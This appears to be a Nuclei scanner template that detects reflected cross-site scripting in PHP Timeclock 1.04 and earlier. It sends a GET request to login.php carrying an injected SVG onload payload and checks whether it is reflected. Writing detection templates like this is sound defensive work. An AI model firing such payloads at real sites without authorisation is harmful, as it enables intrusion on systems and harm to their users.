http:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - <svg/onload=alert`{{randstr}}`>
    - PHP Timeclock Admin Login
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/login.php/''%3E%3Csvg/onload=alert%60{{randstr}}%60%3E'
id: php-timeclock-xss
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: PHP Timeclock 1.04 and prior contains multiple cross-site scripting
    vulnerabilities via login.php, timeclock.php, reports/audit.php. and reports/timerpt.php
  metadata:
    max-request: 1
  name: PHP Timeclock <=1.04 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/49853
  severity: high
  tags: xss,php,timeclock,edb,intrusive
